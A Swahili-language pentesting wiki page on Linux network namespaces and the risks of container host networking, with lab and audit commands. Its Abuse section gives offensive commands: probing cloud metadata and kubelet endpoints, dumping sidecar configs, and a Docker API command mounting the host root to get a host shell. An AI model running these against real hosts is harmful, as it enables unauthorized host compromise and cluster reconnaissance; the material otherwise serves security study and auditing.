# Network Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

Network namespace hutenga rasilimali zinazohusiana na mtandao kama vile interfaces, anwani za IP, routing tables, hali ya ARP/neighbor, firewall rules, sockets, UNIX-domain abstract socket namespace, na maudhui ya faili kama `/proc/net`.<sup>[[2]](#references)</sup> Hii ndiyo sababu container inaweza kuwa na kitu kinachoonekana kama `eth0` yake, routes zake za ndani, na loopback device yake bila kumiliki network stack halisi ya host.

Kwa upande wa usalama, hili ni muhimu kwa sababu network isolation inahusu mengi zaidi ya port binding. Private network namespace hupunguza kile ambacho workload inaweza kuchunguza au kusanidi upya moja kwa moja. Mara namespace hiyo inaposhirikiwa na host, container inaweza ghafla kupata mwonekano wa host listeners, huduma za ndani za host, abstract AF_UNIX endpoints, na network control points ambazo hazikukusudiwa kuonyeshwa kwa application.

## Uendeshaji

Network namespace mpya iliyoundwa huanza ikiwa na mazingira ya mtandao yaliyo tupu au karibu tupu hadi interfaces ziunganishwe nayo. Container runtimes kisha huunda au kuunganisha virtual interfaces, kugawa anwani, na kusanidi routes ili workload ipate connectivity inayotarajiwa. Katika deployments zinazotumia bridge, kwa kawaida hii humaanisha kuwa container huona interface inayotegemea veth iliyounganishwa na host bridge. Katika Kubernetes, CNI plugins hushughulikia usanidi unaolingana wa Pod networking.

Architecture hii inaeleza kwa nini `--network=host` au `hostNetwork: true` ni mabadiliko makubwa sana. Badala ya kupokea private network stack iliyoandaliwa, workload hujiunga na ile halisi ya host.

## Lab

Unaweza kuona network namespace iliyo karibu tupu kwa kutumia:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Na unaweza kulinganisha containers za kawaida na zenye host-networking kwa:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Container iliyounganishwa kwenye host network haina tena mwonekano wake binafsi uliotengwa wa sockets na interfaces. Mabadiliko hayo pekee tayari ni muhimu kabla hata hujauliza process ina capabilities zipi.

## Matumizi ya Runtime

Docker na Podman kwa kawaida huunda network namespace binafsi kwa kila container isipokuwa zisanidiwe vinginevyo. Kubernetes kwa kawaida huipa kila Pod network namespace yake, inayoshirikiwa na containers zilizo ndani ya Pod hiyo lakini ikiwa imetengwa na host. Hii inamaanisha `127.0.0.1` kwa kawaida huwa ya kiwango cha Pod badala ya kiwango cha container: listener iliyofungwa kwenye localhost pekee ndani ya container moja kwa kawaida inaweza kufikiwa na sidecars na siblings zake. Mifumo ya Incus/LXC pia hutoa isolation yenye uwezo mkubwa inayotegemea network namespace, mara nyingi ikiwa na aina nyingi zaidi za usanidi wa virtual networking.

Kanuni ya kawaida ni kwamba private networking ndiyo isolation boundary ya kawaida, huku host networking ikiwa ni kujiondoa kwa makusudi kwenye boundary hiyo.

## Misconfigurations

Misconfiguration muhimu zaidi ni kushiriki tu host network namespace. Hili wakati mwingine hufanywa kwa ajili ya performance, low-level monitoring, au urahisi, lakini huondoa mojawapo ya boundaries bora zaidi zinazopatikana kwa containers. Listeners za ndani ya host zinaweza kufikiwa kwa njia ya moja kwa moja zaidi, services zinazofungwa kwenye localhost pekee zinaweza kufikiwa, na capabilities kama `CAP_NET_ADMIN` au `CAP_NET_RAW` huwa hatari zaidi kwa sababu operations zinazoziwezesha sasa zinatekelezwa kwenye network environment ya host yenyewe.

Tatizo lingine ni kugawa network-related capabilities kwa kiwango cha juu kupita kiasi hata wakati network namespace ni private. Namespace binafsi husaidia, lakini haifanyi raw sockets au advanced network control kuwa salama moja kwa moja.

Katika Kubernetes, `hostNetwork: true` pia hubadilisha kiwango cha imani unachoweza kuweka kwenye Pod-level network segmentation. Kubernetes inaeleza kwamba network plugins nyingi haziwezi kutofautisha ipasavyo traffic ya Pod yenye `hostNetwork` wakati wa matching ya `podSelector` / `namespaceSelector`, na hivyo huitendea kama traffic ya kawaida ya node.<sup>[[1]](#references)</sup> Kwa mtazamo wa attacker, hii inamaanisha workload iliyoathiriwa yenye `hostNetwork` mara nyingi inapaswa kuchukuliwa kama network foothold ya kiwango cha node badala ya kuwa Pod ya kawaida ambayo bado imewekewa vikwazo na assumptions zilezile za policy kama workloads za overlay-network.

## Abuse

Katika setups zenye isolation dhaifu, attackers wanaweza kukagua services zinazosikiliza kwenye host, kufikia management endpoints zilizofungwa kwenye loopback pekee, kusniff au kuingilia traffic kutegemea capabilities na environment halisi, au kusanidi upya routing na firewall state ikiwa `CAP_NET_ADMIN` ipo. Kwenye cluster, hili pia linaweza kurahisisha lateral movement na reconnaissance ya control-plane.

Ukishuku matumizi ya host networking, anza kwa kuthibitisha kwamba interfaces na listeners zinazoonekana ni za host badala ya kuwa za container network iliyotengwa:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Huduma zinazopatikana kupitia loopback pekee mara nyingi huwa ugunduzi wa kwanza wa kuvutia:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
UNIX sockets ni shabaha nyingine ambayo ni rahisi kupuuzwa kwa sababu ziko ndani ya network namespace husika, ingawa hazionekani kama TCP/UDP listeners na huenda zisiwepo kama filesystem paths chini ya `/run`. Kwa hivyo, container inayotumia host network inaweza kurithi ufikiaji wa control channels za host pekee ambazo hazikuwahi bind-mounted ndani ya container hata kidogo:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Mfano wa kihistoria ulikuwa bug ya `containerd-shim` ya kufichuka kwa abstract socket, lakini somo pana ni muhimu zaidi kuliko CVE mahususi: mara workload inapojiunga na host network namespace, huduma za abstract AF_UNIX huwa pia sehemu ya attack surface.<sup>[[3]](#references)</sup> Ikiwa socket hizo zinaonekana kuwa zinazohusiana na runtime au za kiutawala, hamia kwenye [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Ikiwa network capabilities zipo, jaribu kuchunguza iwapo workload inaweza kukagua au kubadilisha stack inayoonekana:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Kwenye kernels za kisasa, host networking pamoja na `CAP_NET_ADMIN` vinaweza pia kufichua packet path zaidi ya mabadiliko rahisi ya `iptables` / `nftables`. `tc` qdiscs na filters pia zina scope ya namespace, hivyo katika host network namespace iliyoshirikiwa zinatumika kwenye interfaces za host ambazo container inaweza kuona. Ikiwa `CAP_BPF` pia ipo, eBPF programs zinazohusiana na network kama TC na XDP loaders nazo huwa muhimu:<sup>[[4]](#references)</sup>
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Hili ni muhimu kwa sababu attacker anaweza ku-mirror, ku-redirect, ku-shape au ku-drop traffic katika kiwango cha host interface, si kuandika upya firewall rules pekee. Katika private network namespace, vitendo hivyo hubaki ndani ya mwonekano wa container; katika shared host namespace, huanza kuathiri host.

Katika mazingira ya cluster au cloud, host networking pia huhalalisha local recon ya haraka ya metadata na services zilizo karibu na control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Katika Kubernetes, kumbuka kwamba ku-compromise **container** yoyote katika Pod yenye **containers** nyingi pia kunatoa ufikiaji wa **localhost listeners** zilizofunguliwa na **containers** wenza na **sidecars**, kwa sababu Pod nzima inashiriki **network namespace** moja. Hili huwa muhimu hasa kwa **service-mesh**, **observability**, na **helper containers** ambazo **admin** au **debug interfaces** zao zimekusudiwa kuwa za ndani ya Pod badala ya kuwa za **cluster** nzima:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Chukulia "bound to localhost" kama **Pod-private**, si **container-private**. Baada ya container moja ndani ya Pod ku-compromise, dhana hiyo haipo tena.

### Mfano Kamili: Host Networking + Local Runtime / Kubelet Access

Host networking haitoi host root moja kwa moja, lakini mara nyingi hufichua services ambazo zimekusudiwa kufikiwa kutoka kwenye node yenyewe pekee. Ikiwa mojawapo ya services hizo imelindwa kwa udhaifu, host networking huwa njia ya moja kwa moja ya privilege-escalation.

Docker API kwenye localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet kwenye localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Athari:

- compromise ya moja kwa moja ya host ikiwa API ya runtime ya ndani imefichuliwa bila ulinzi unaofaa
- upelelezi wa cluster au lateral movement ikiwa kubelet au agents za ndani zinaweza kufikiwa
- manipulation ya traffic au denial of service inapounganishwa na `CAP_NET_ADMIN`

## Ukaguzi

Lengo la ukaguzi huu ni kubaini ikiwa process ina network stack binafsi, ni routes na listeners zipi zinaonekana, na ikiwa mtazamo wa network tayari unaonekana kama wa host kabla hata hujajaribu capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Kinachovutia hapa:

- Ikiwa `/proc/self/ns/net` na `/proc/1/ns/net` tayari vinaonekana kama vya host, container inaweza kuwa inashiriki network namespace ya host au namespace nyingine isiyo ya faragha.
- `lsns -t net` na `ip netns identify` ni muhimu wakati shell tayari iko ndani ya namespace iliyopewa jina au persistent namespace, na unataka kuihusisha na objects za `/run/netns` kutoka upande wa host.
- `ss -lntup` ni muhimu sana kwa sababu hufichua listeners wa loopback pekee na endpoints za usimamizi za ndani. `ss -xap` na `/proc/net/unix` huongeza mwonekano wa abstract sockets ambao uchunguzi wa kawaida wa sockets za filesystem hukosa.
- Routes, majina ya interfaces, muktadha wa firewall, hali ya `tc`, na eBPF attachments huwa muhimu zaidi ikiwa `CAP_NET_ADMIN`, `CAP_NET_RAW`, au `CAP_BPF` ipo.
- Katika Kubernetes, kushindwa kwa service-name resolution kutoka kwa Pod yenye `hostNetwork` kunaweza kumaanisha tu kwamba Pod haitumii `dnsPolicy: ClusterFirstWithHostNet`, si kwamba service haipo.
- Katika Pods zenye containers nyingi, listeners za localhost ni za network namespace nzima ya Pod, kwa hivyo kagua sidecars na containers zilizo jirani kabla ya kudhani kwamba port ya loopback pekee haiwezi kufikiwa kutoka kwa container iliyoathiriwa.

Unapokagua container, kila mara tathmini network namespace pamoja na capability set. Host networking pamoja na network capabilities imara ni posture tofauti sana na bridge networking pamoja na default capability set iliyo finyu.

## Marejeo

- [1] [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [2] [Linux `network_namespaces(7)` and abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [3] [containerd advisory: abstract Unix domain sockets exposed to host-network containers](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [4] [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)

{{#include ../../../../../banners/hacktricks-training.md}}
